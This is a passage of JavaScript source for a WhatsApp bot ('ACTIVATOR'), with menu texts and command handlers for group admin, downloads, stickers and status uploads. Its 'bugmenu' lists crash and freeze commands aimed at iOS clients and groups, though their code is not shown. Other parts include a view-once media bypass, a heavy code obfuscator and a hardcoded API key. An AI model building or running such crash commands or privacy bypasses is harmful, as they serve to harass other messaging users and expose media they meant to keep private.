│ 📡 Mode          : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
│ 👥 Users         : ${Object.keys(db.data.users).length}
│ 🏷️ Prefix        : Single
│ 📋 Total Cmds    : ${totalCases}
╰────────────────────────╯

┌───『 ⚙️ 𝐒𝐘𝐒𝐓𝐄𝐌 』───┐
│ 🔧 ${prefix}self
│ 🌐 ${prefix}public
│ 🔗 ${prefix}join
│ 🚫 ${prefix}block
│ ✅ ${prefix}unblock
│ 🆔 ${prefix}cekidgc
│ 🧷 ${prefix}creategc
└──────────────────────┘

〄 Powered by MR SMILE

`;
ReplyMultiMenu3(Menu)
    await bot.sendMessage(
    m.chat,
    {
      audio: { url: 'https://files.catbox.moe/e3m7nj.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: mdmodes }
  );   
}
break               
//==================================================// 
        case 'bugmenu':
case 'crashmenu': {
let Menu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
╭─❖ ⌜ ✦ 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 ✦ ⌟ ❖─╮
│ 👨‍💻 Creator       : Mr Smile
│ 🔄 Version       : New Version
│ 🧩 Type          : Case
│ ⚙️ Status        : Ready
│ 📡 Mode          : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
│ 👥 Users         : ${Object.keys(db.data.users).length}
│ 🏷️ Prefix        : Single
│ 🧾 Total Cmds    : ${totalCases}
╰────────────────────────╯

┌───『 🐌 𝐃𝐄𝐋𝐀𝐘-𝐁𝐔𝐆𝐒 』───┐
│ 🐞 ${prefix}delay-invis
│ 🐞 ${prefix}delay-hard
│ 🐞 ${prefix}invis-hard
└───────────────────────┘

┌───『 💥 𝐂𝐑𝐀𝐒𝐇-𝐁𝐔𝐆𝐒 』───┐
│ ⚠️ ${prefix}crash-infinite
│ ⚠️ ${prefix}crashch
│ ⚠️ ${prefix}crash-ios
│ ⚠️ ${prefix}force-close
│ ⚠️ ${prefix}crash-null
└───────────────────────┘

┌───『 🧨 𝐆𝐑𝐎𝐔𝐏-𝐀𝐓𝐓𝐀𝐂𝐊 』───┐
│ 💣 ${prefix}blank-group
│ 💣 ${prefix}crashgroup
│ 💣 ${prefix}frezegrup
└───────────────────────┘

〄 Powered by MR SMILE

`;
ReplyMultiMenu3(Menu)
    await bot.sendMessage(
    m.chat,
    {
      audio: { url: 'https://files.catbox.moe/e3m7nj.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: mdmodes }
  );   
}
break                                 
//==================================================//

           
//==================================================//
     case 'settingmenu':
case 'setmenu': {
let Menu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻

╭─❖ ⌜ ✦ 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 ✦ ⌟ ❖─╮
│ 👨‍💻 Creator        : Mr Smile
│ 🔄 Version        : New Version
│ 🧩 Type           : Case System
│ ⚙️ Status         : Ready
│ 📡 Mode           : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
│ 👥 Users          : ${Object.keys(db.data.users).length}
│ 🏷️ Prefix         : Single
│ 🧾 Total Cmds     : ${totalCases}
╰────────────────────────╯

┌───『 ⚙️ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 』───┐
│ 📝 ${prefix}autotype
│ 🔊 ${prefix}autorecordtype
│ 🖼️ ${prefix}setpp
│ 🗑️ ${prefix}delpp
│ 🧬 ${prefix}setbio
│ 🗂️ ${prefix}setmenu
│ 👀 ${prefix}statusview
│ 👥 ${prefix}onlygroup
│ 💬 ${prefix}onlypc
└───────────────────────┘

〄 Powered by MR SMILE

`;
ReplyMultiMenu3(Menu)
    await bot.sendMessage(
    m.chat,
    {
      audio: { url: 'https://files.catbox.moe/e3m7nj.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: mdmodes }
  );   
}
break                                   
//==================================================//
        case 'othermenu':
case 'others': {
let Menu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
╭─❖ ⌜ 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 ⌟ ❖─╮
│ 🧠 Creator       : Mr Smile
│ 🧩 Version       : New Version
│ 🗂️ Type          : Case
│ ⚙️ Status        : Ready
│ 📡 Mode          : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
│ 👤 Users         : ${Object.keys(db.data.users).length}
│ 🔖 Prefix        : Single
│ 📋 Total Cmds    : ${totalCases}
╰───────────────╯

┌───『 📍 𝐆𝐑𝐎𝐔𝐏 』───┐
│ 🔹 ${prefix}kick
│ 🔹 ${prefix}add
│ 🔹 ${prefix}kill
│ 🔹 ${prefix}promote
│ 🔹 ${prefix}demote
│ 🔹 ${prefix}open
│ 🔹 ${prefix}close
│ 🔹 ${prefix}link
│ 🔹 ${prefix}hidetag
│ 🔹 ${prefix}tagall
│ 🔹 ${prefix}approve
│ 🔹 ${prefix}reject
│ 🔹 ${prefix}reset
│ 🔹 ${prefix}clearchat
│ 🔹 ${prefix}setppgroup
└───────────────┘

┌───『 ⬇️ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 』───┐
│ 🎵 ${prefix}play
│ 🎞️ ${prefix}tt
│ 📸 ${prefix}igdl
│ 🎶 ${prefix}song
│ 📘 ${prefix}fb
│ 🔍 ${prefix}yts
│ 📝 ${prefix}lyrics
│ 🎬 ${prefix}movie
│ 📥 ${prefix}ytmp4
│ 📱 ${prefix}apk
│ ❌ ${prefix}downxxx
└───────────────┘

┌───『 🔁 𝐂𝐎𝐍𝐕𝐄𝐑𝐒𝐈𝐎𝐍 』───┐
│ 📺 ${prefix}toptv
│ 🖼️ ${prefix}sticker
│ ✨ ${prefix}fancy
│ 🖼️ ${prefix}toimage
│ 🎥 ${prefix}tovideo
│ 🔉 ${prefix}toaudio
│ 📽️ ${prefix}vv
│ 📷 ${prefix}remini
│ 🧷 ${prefix}take
│ 🌐 ${prefix}translate
│ 🔐 ${prefix}enc
│ ⚡ ${prefix}flux
└───────────────┘

┌───『 📦 𝐂𝐎𝐋𝐋𝐄𝐂𝐓𝐈𝐎𝐍 』───┐
│ 🆔 ${prefix}getname
│ 🖼️ ${prefix}getpp
│ 🖼️ ${prefix}getppgc
│ 🧾 ${prefix}getbusiness
│ 🚫 ${prefix}listblock
│ 🗂️ ${prefix}listpc
│ 🏘️ ${prefix}gcinfo
│ 🧭 ${prefix}lookup
│ 🧬 ${prefix}gitclone
│ 🤖 ${prefix}chatgpt
│ 🧠 ${prefix}script
└───────────────┘

┌───『 🎙️ 𝐕𝐎𝐈𝐂𝐄 』───┐
│ 🎧 ${prefix}bass
│ 💥 ${prefix}blown
│ 🤖 ${prefix}robot
│ 🐌 ${prefix}slow
│ 🧈 ${prefix}smooth
│ 🐷 ${prefix}fat
│ ⚡ ${prefix}fast
│ 🌙 ${prefix}nightcore
│ 🧨 ${prefix}earrape
└───────────────┘

┌───『 🔊 𝐒𝐎𝐔𝐍𝐃 』───┐
│ 🎼 ${prefix}sound1 - sound161
└───────────────┘

┌───『 🔍 𝐒𝐓𝐀𝐋𝐊𝐄𝐑 』───┐
│ 📱 ${prefix}ttstalk
└───────────────┘

┌───『 🧩 𝐒𝐘𝐒𝐓𝐄𝐌-𝐏𝐀𝐈𝐑 』───┐
│ 💞 ${prefix}pair
│ 🔗 ${prefix}wise-paired
│ ❌ ${prefix}delpair
└───────────────┘

┌───『 🕋 𝐑𝐄𝐋𝐈𝐆𝐈𝐎𝐍 』───┐
│ 📖 ${prefix}bible
│ 🕌 ${prefix}quran
└───────────────┘

┌───『 🪄 𝐒𝐓𝐀𝐓𝐔𝐒-𝐔𝐏𝐋𝐎𝐀𝐃 』───┐
│ 🎧 ${prefix}storyaudio
│ 🎥 ${prefix}storyvideo
│ 🖼️ ${prefix}storyimage
│ 📝 ${prefix}storytext
└───────────────┘

〄 Powered by MR SMILE



`;
ReplyMultiMenu3(Menu)
    await bot.sendMessage(
    m.chat,
    {
      audio: { url: 'https://files.catbox.moe/e3m7nj.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: mdmodes }
  );   
}
break                            
//==================================================//  
        case 'cpanelmenu':
case 'panelmenu': {
let Menu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻

╭─❖ ⌜ ✦ 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 ✦ ⌟ ❖─╮
│ 👨‍💻 Creator      : Mr Smile
│ 🧩 Version      : New Version
│ 🗂️ Type         : Case System
│ ⚙️ Status       : Ready for Commands
│ 📡 Mode         : ${bot.public ? '☑ Public Mode' : '☒ Self Mode'}
│ 👤 Users        : ${Object.keys(db.data.users).length}
│ 🏷️ Prefix       : Single
╰────────────────────╯

┌───『 📦 𝐃𝐀𝐓𝐀-𝐏𝐀𝐍𝐄𝐋 』───┐
│ 📶 ${prefix}1gb
│ 📶 ${prefix}2gb
│ 📶 ${prefix}3gb
│ 📶 ${prefix}4gb
│ 📶 ${prefix}5gb
│ 📶 ${prefix}6gb
│ 📶 ${prefix}7gb
│ 📶 ${prefix}8gb
│ 📶 ${prefix}9gb
│ 📶 ${prefix}10gb
│ 🔓 ${prefix}unli
│ 🗃️ ${prefix}listserver
└────────────────────┘

〄 Powered by MR SMILE

`;
ReplyMultiMenu3(Menu)
    await bot.sendMessage(
    m.chat,
    {
      audio: { url: 'https://files.catbox.moe/e3m7nj.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: mdmodes }
  );   
}
break                            
//===============================================//
        case "ping": { 
  await loading ()     
    let timestamp = speed();
    let latency = speed() - timestamp;
    reply2(`🔹 Pong: ${latency.toFixed(4)} MS ⚡`);
} 
break;
          
//==================================================// 
case 'getbisnis': case 'getbusiness': {
  const moment = require('moment-timezone');
  let input = m.quoted ? m.quoted.sender : text || m.sender;
  input = input.replace(/[^+\d]/g, '');
  let target;
  if (input.startsWith('+')) {
    target = input.slice(1).replace(/^0+/, '') + '@s.whatsapp.net';
  } else if (input.startsWith('0')) {
    target = '254' + input.slice(1) + '@s.whatsapp.net';
  } else if (input.startsWith('62')) {
    target = input + '@s.whatsapp.net';
  } else if (input.includes('@s.whatsapp.net')) {
    target = input;
  } else {
    target = '254' + input + '@s.whatsapp.net';
  }

  try {
    const profile = await bot.getBusinessProfile(target);
    const name = await bot.getName(target); 
    const pfp = await bot.profilePictureUrl(target, 'image').catch(() => null);
    const desc = profile.description || 'invalid.';
    const category = profile.category ||'invalid';
    const website = profile.website || 'invalid';
    const address = profile.address || 'invalid';
    const email = profile.email || 'invalid';
    const caption = `*📇Business profile*\n\n` +
      `*👤 Name:* ${name}\n` +
      `*🏢 Category:* ${category}\n` +
      `*🌐 Website:* ${website}\n` +
      `*📍 Address:* ${address}\n` +
      `*✉️ Email:* ${email}\n\n` +
      `*📝 Description:*\n${desc}`;
    if (pfp) {
      await bot.sendMessage(m.chat, {
        image: { url: pfp },
        caption,
      }, { quoted: m });
    } else {
      m.reply(caption);
    }
  } catch (err) {
    console.error(err);
    m.reply('error.');
  }
}
break 
//==================================================//    
        case "invite": case "link": { 
                 if (!m.isGroup) return ReplyMultiMenu2 (mess.group); 
                 if (!isBotAdmins) return ReplyMultiMenu2 ("bot must be admin in group"); 
                 let response = await bot.groupInviteCode(m.chat); 
                 bot.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
             } 
          break;
        //==================================================//
        case 'public': {
if (!Owner) return ReplyMultiMenu2(mess.owner)
bot.public = true
ReplyMultiMenu2('Sukses changed to public mode')
}
break
//==================================================//      
case 'self': {
if (!Owner) return ReplyMultiMenu2(mess.owner)
bot.public = false
ReplyMultiMenu2('Success changed to self mode')
}
break
//==================================================//
     case 'onlyprivatechat':
            case 'onlypc':
                if (!Owner) return ReplyMultiMenu2(mess.owner)
                if (args.length < 1) return ReplyMultiMenu2(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlypc = true
                    ReplyMultiMenu2(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlypc = false
                    ReplyMultiMenu2(`Successfully Changed Only-Pc To ${q}`)
                }
            break  
//==================================================//      
     case 'onlygroup':
            case 'onlygc':
                if (!Owner) return ReplyMultiMenu2(mess.owner)
                if (args.length < 1) return ReplyMultiMenu2(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlygrub = true
                    ReplyMultiMenu2(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlygrub = false
                    ReplyMultiMenu2(`Successfully Changed Onlygroup To ${q}`)
                }
            break //==================================================//
case 'kick': {
if (!isGroup) return ReplyMultiMenu2(mess.group)
if (!isBotAdmins) return ReplyMultiMenu2("bot must be admin first")
if (!Owner) return ReplyMultiMenu2(mess.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bot.groupParticipantsUpdate(m.chat, [users], 'remove')
ReplyMultiMenu2(`Sukses kick @${users.split('@')[0]}`)
}
break
//==================================================//                     
            case "take": {
                if (!args.join(" ")) return ReplyMultiMenu2(`\n*ex:* ${prefix + command} Mmk\n`)
                const swn = args.join(" ")
                const pcknm = swn.split("|")[0]
                const atnm = swn.split("|")[1]
                if (m.quoted.isAnimated === true) {
                    bot.downloadAndSaveMediaMessage(quoted, "gifee")
                    bot.sendMessage(m.chat, {
                        sticker: fs.readFileSync("./list/Temporary/gifee.webp")
                    }, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await bot.sendImageAsSticker(m.chat, media, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 10) return ReplyMultiMenu2('\nmaximum duration 10 seconds\n')
                    let media = await quoted.download()
                    let encmedia = await bot.sendVideoAsSticker(m.chat, media, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else {
                    ReplyMultiMenu2(`\n*ex:* reply image/video ${prefix + command}\n`)
                }
            }
                break

//==================================================//              
        case "movie": 
             if (!text) return ReplyMultiMenu2(`Provide a series or movie name.`);  
              let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`);  
              let imdbt = "";  
              console.log(fids.data)  
              imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB MOVIE SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n";  
              imdbt += "🎬Title      : " + fids.data.Title + "\n";  
              imdbt += "📅Year       : " + fids.data.Year + "\n";  
              imdbt += "⭐Rated      : " + fids.data.Rated + "\n";  
              imdbt += "📆Released   : " + fids.data.Released + "\n";  
              imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n";  
              imdbt += "🌀Genre      : " + fids.data.Genre + "\n";  
              imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n";  
              imdbt += "✍Writer     : " + fids.data.Writer + "\n";  
              imdbt += "👨Actors     : " + fids.data.Actors + "\n";  
              imdbt += "📃Plot       : " + fids.data.Plot + "\n";  
              imdbt += "🌐Language   : " + fids.data.Language + "\n";  
              imdbt += "🌍Country    : " + fids.data.Country + "\n";  
              imdbt += "🎖️Awards     : " + fids.data.Awards + "\n";  
              imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n";  
              imdbt += "🏙️Production : " + fids.data.Production + "\n";  
              imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n";  
              imdbt += "❎imdbVotes  : " + fids.data.imdbVotes + "";  
             bot.sendMessage(from, {  
                  image: {  
                      url: fids.data.Poster,  
                  },  
                  caption: imdbt,  
              },  
                 { quoted: m }); 
  
                       break;
//==================================================//             
        case "setppgc": {
if (!isGroup) return ReplyMultiMenu2(mess.group)
if (!isBotAdmins) return ReplyMultiMenu2(mess.adminbot)
if (!isBotAdmins) return ReplyMultiMenu2(mess.admin)
if (/image/g.test(mime)) {
let media = await bot.downloadAndSaveMediaMessage(qmsg)
await bot.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
ReplyMultiMenu2("Group profile photo changed successfully by Wise-Al")
} else return ReplyMultiMenu2('tag/reply foto')}
break
//==================================================//     
        case 'creategc': case 'creategroup': {
if (!Owner) return ReplyMultiMenu2(mess.owner)
if (!args.join(" ")) return ReplyMultiMenu2(`Use ${prefix+command} groupname`)
try {
let cret = await bot.groupCreate(args.join(" "), [])
let response = await bot.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
bot.sendMessage(m.chat, { text:teksop, mentions: await bot.parseMention(teksop)}, {quoted:m})
} catch {
	ReplyMultiMenu2(`Error`)
	}
}
break
//==================================================//              
        case "open": {
if (!isGroup) return m.ReplyMultiMenu2(mess.group)
if (!isBotAdmins) return ReplyMultiMenu2("bot must be admin first")
if (!Owner) return ReplyMultiMenu2(mess.owner)
await bot.groupSettingUpdate(m.chat, 'not_announcement')
ReplyMultiMenu2("Success opened group chat,all members can send messages in group now")
}
break
//==================================================// 
        case "sc": 
        case "repo": 
        case "script": {
await bot.sendMessage(m.chat, { react: { text: "📄",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./Media/babe.jpg") }, { upload: bot.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `*ACTIVATOR*`,
}), 
contextInfo: {}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Script ACTIVATOR*`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy from Me\",\"url\":\"https://wa.me/254107065646\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Get From Channel\",\"url\":\"https://whatsapp.com/channel/0029VaesBAXJJhzefVszDu3h\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: loli})
await bot.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}

break
//==================================================//               
        case "vv": case "readviewonce": case "•": {
if (!m.quoted) return ReplyMultiMenu2("reply to a view once media")
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.ReplyMultiMenu2("this is not a view once message!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return bot.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || "Retrieved by Activator"}, {quoted: m})
    } else if (/image/.test(type)) {
        return bot.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || "Retrieved by Activator"}, {quoted: m})
    } else if (/audio/.test(type)) {
        return bot.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
//==================================================//            
        case "apk":
      case "apkdl":
        {
          if (!text) return ReplyMultiMenu2("*Which apk do you want to download?*");
        let kyuu = await fetchJson (`https://bk9.fun/search/apk?q=${text}`);
        let tylor = await fetchJson (`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
         await bot.sendMessage(
              m.chat,
              {
                document: { url: tylor.BK9.dllink },
                fileName: tylor.BK9.name,
                mimetype: "application/vnd.android.package-archive",
                contextInfo: {
        externalAdReply: {
          title: global.botname,
          body: `${tylor.BK9.name}`,
          thumbnailUrl: `${tylor.BK9.icon}`,
          sourceUrl: `${tylor.BK9.dllink}`,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: loli });
          }
      break;
//==================================================//              
  case "ytmp4":
case "ytvideo": {
 if (!q) return ReplyMultiMenu2(`Example: ${prefix + command} https://youtube.com/watch?v=CVLeZpg6Kzk 144/240/360/480/720/1080`);
 const args = q.split(' ');
 const url = args[0];
 const availableResolutions = ['144', '240', '360', '480', '720', '1080'];
 let quality = args[1] && availableResolutions.includes(args[1]) ? args[1] : '480';
 if (!url.match(/^(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/)) {
 return ReplyMultiMenu2(`Please provide a valid YouTube URL\n\nAvailable resolutions: ${availableResolutions.join(', ')}`);
 }
 ReplyMultiMenu2(`processing your request`);
 try {
 const apiUrl = `https://api.hiuraa.my.id/downloader/savetube?url=${encodeURIComponent(url)}&format=${quality}`;
 const response = await fetch(apiUrl);
 const data = await response.json();
 if (!data.status || !data.result) {
 return ReplyMultiMenu2('Failed to download the video');
 }
 const { title, duration, thumbnail, download } = data.result;
 await bot.sendMessage(m.chat, {
 image: { url: thumbnail },
 caption: `*${title}*\n*${quality}p* | *${duration}*`
 }, { quoted: loli });
 
 await bot.sendMessage(m.chat, {
 video: { url: download },
 mimetype: 'video/mp4'
 }, { quoted: loli });
 
 } catch (error) {
 console.error('Error downloading YouTube video:', error);
 ReplyMultiMenu2('An error occurred while downloading the video');
 }
 }
 break  
//==================================================//           
    case 'git': case 'gitclone':
if (!args[0]) return ReplyMultiMenu2(`Where is the link?\nExample :\n${prefix}${command} https://github.com/`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return ReplyMultiMenu2(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    bot.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: loli }).catch((err) => ReplyMultiMenu2(mess.error))
break
//==================================================//                   
        case 'setppgroup': {
if (!isGroup) return ReplyMultiMenu2('Only Group')
if (!isAdmins) return ReplyMultiMenu2('Only Admin')
if (!isBotAdmins) return ReplyMultiMenu2('make bot an admin in this group first idiot')
if (!quoted) return ReplyMultiMenu2(`*Where is the picture?*`)
if (!/image/.test(mime)) return ReplyMultiMenu2(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return ReplyMultiMenu2(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await bot.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await bot.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
ReplyMultiMenu2(`*Success Beb✅*`)
} else {
var memeg = await bot.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
ReplyMultiMenu2(`*Success Beb✅*`)
}
}
break
//==================================================//          
case "close": {
if (!isGroup) return ReplyMultiMenu2(mess.group)
if (!isBotAdmins) return ReplyMultiMenu2("bot must be admin first")
if (!Owner) return ReplyMultiMenu2(mess.owner)
await bot.groupSettingUpdate(m.chat, 'announcement')
ReplyMultiMenu2("Success closed group chat,all members are not allowed to chat for now")
}
break
//==================================================//        
        case 'storyaudio':
			case 'upswaudio': {
				if (!Owner) return ReplyMultiMenu2(mess.owner);
				if (/audio/.test(mime)) {
					var audiosw = await bot.downloadAndSaveMediaMessage(quoted);
					await bot.sendMessage('status@broadcast', {
						audio: { url: audiosw },
						mimetype: 'audio/mp4',
						ptt: true
					}, {
						backgroundColor: '#FF000000',
						statusJidList: Object.keys(db.data.users)
					});
					await ReplyMultiMenu2('✅ success upload audio to status!');
				} else {
					ReplyMultiMenu2('⚠️ Reply to audio with command ! 🎧');
				}
			}
			break;
//==================================================//          
        case 'storyimg':
			case 'storyimage':
			case 'upswimg': {
				if (!Owner) return m.ReplyMultiMenu2(mess.owner);
				if (/image/.test(mime)) {
					var imagesw = await bot.downloadAndSaveMediaMessage(quoted);
					let fileSize = quoted.fileLength ? `${(quoted.fileLength / 1024 / 1024).toFixed(2)} MB` : 'Tidak diketahui';
					let mediaType = mime || 'Tidak diketahui';
					let sendTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
					let sender = `${m.pushName || ownerName}`;
					let defaultCaption = `📁 *Size File*: ${fileSize}\n`;
					defaultCaption += `🖼️ *Media Type*: ${mediaType}\n`;
					defaultCaption += `⏰ *Time*: ${sendTime}\n`;
					defaultCaption += `👤 *Sender*: ${sender}`;
					await bot.sendMessage('status@broadcast', {
						image: { url: imagesw },
						caption: text ? text : defaultCaption
					}, {
						statusJidList: Object.keys(db.data.users)
					});

					await ReplyMultiMenu2('✅ success uploaded photo to status! 🖼️✨');
				} else {
					m.reply('⚠️ reply to image with command ! 🖼️');
				}
			}
			break;
//==================================================//           
        case 'storyvideo':
			case 'upswvideo': {
				if (!Owner) return m.ReplyMultiMenu2(mess.owner);
				if (/video/.test(mime)) {
					var videosw = await bot.downloadAndSaveMediaMessage(quoted);
					let fileSize = quoted.fileLength ? `${(quoted.fileLength / 1024 / 1024).toFixed(2)} MB` : 'Tidak diketahui';
					let mediaType = mime || 'Tidak diketahui';
					let sendTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
					let sender = `${m.pushName || ownerName}`;
					let defaultCaption = `📁 *Size File*: ${fileSize}\n`;
					defaultCaption += `🎥 *Media Type*: ${mediaType}\n`;
					defaultCaption += `⏰ *Time*: ${sendTime}\n`;
					defaultCaption += `👤 *Sender*: ${sender}`;
					await bot.sendMessage('status@broadcast', {
						video: { url: videosw },
						caption: text ? text : defaultCaption
					}, {
						statusJidList: Object.keys(db.data.users)
					});

					await m.reply('✅ success uploaded video to status!');
				} else {
					m.reply('⚠️ reply a video! 🎥');
				}
			}
			break;
//==================================================//          
        case 'storytext':
			case 'upswtext': {
				if (!Owner) return m.ReplyMultiMenu2(mess.owner);
				if (!text) return m.ReplyMultiMenu2('where is the text?');
				await bot.sendMessage('status@broadcast', { 
					text: text 
				}, { 
					backgroundColor: '#FF000000', 
					font: 3, 
					statusJidList: Object.keys(db.data.users) 
				});
				m.reply('Succes uploaded text!');
			}
			break;
//==================================================//   
        case "listidch": case "listid": {
if (channel.length < 1) return ReplyMultiMenu2("id channel not found")
let teks = `\n *Total ID Channel :* ${channel.length}\n`
for (let i of channel) {
let res = await bot.newsletterMetadata("jid", i)
teks += `\n* ${i}
* ${res.name}\n`
}
bot.sendMessage(m.chat, {text: teks, mentions: []}, {quoted: m})
}
break
//==================================================//            
        case 'enc':
case 'encrypt': {
const JsConfuser = require('js-confuser')

if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
return ReplyMultiMenu2('❌ Please Reply File To Be Encryption.');
}
const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
const quotedDocument = quotedMessage.documentMessage;
if (!quotedDocument || !quotedDocument.fileName.endsWith('.js')) {
return ReplyMultiMenu2('❌ Please Reply File To Be Encryption.');
}
try {
const fileName = quotedDocument.fileName;
const docBuffer = await m.quoted.download();
if (!docBuffer) {
return ReplyMultiMenu2('❌ Please Reply File To Be Encryption.');
}
await bot.sendMessage(m.chat, {
 react: { text: '🕛', key: m.key }
 });
const obfuscatedCode = await JsConfuser.obfuscate(docBuffer.toString(), {
target: "node",
preset: "high",
compact: true,
minify: true,
flatten: true,
identifierGenerator: function () {
const originalString = "素MR晴SMILE晴" + "素MR晴SMILE晴";
const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素GIDDY晴TENNOR晴]/g, "");
const randomString = (length) => {
let result = "";
const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * characters.length));
}
return result;
};
return removeUnwantedChars(originalString) + randomString(2);
},
renameVariables: true,
renameGlobals: true,
stringEncoding: true,
stringSplitting: 0.0,
stringConcealing: true,
stringCompression: true,
duplicateLiteralsRemoval: 1.0,
shuffle: { hash: 0.0, true: 0.0 },
stack: true,
controlFlowFlattening: 1.0,
opaquePredicates: 0.9,
deadCode: 0.0,
dispatcher: true,
rgf: false,
calculator: true,
hexadecimalNumbers: true,
movedDeclarations: true,
objectExtraction: true,
globalConcealing: true,
});
await bot.sendMessage(m.chat, {
document: Buffer.from(obfuscatedCode, 'utf-8'),
mimetype: 'application/javascript',
fileName: `${fileName}`,
caption: `•Successful Encrypt
•Type: Hard Code
•@Mr Smile modders`,
}, { quoted: loli });

} catch (err) {
console.error('Error during encryption:', err);
await ReplyMultiMenu2(`❌ An error occurred: ${error.message}`);
}
break;
}
//==================================================//            
        case "cekidgc": {
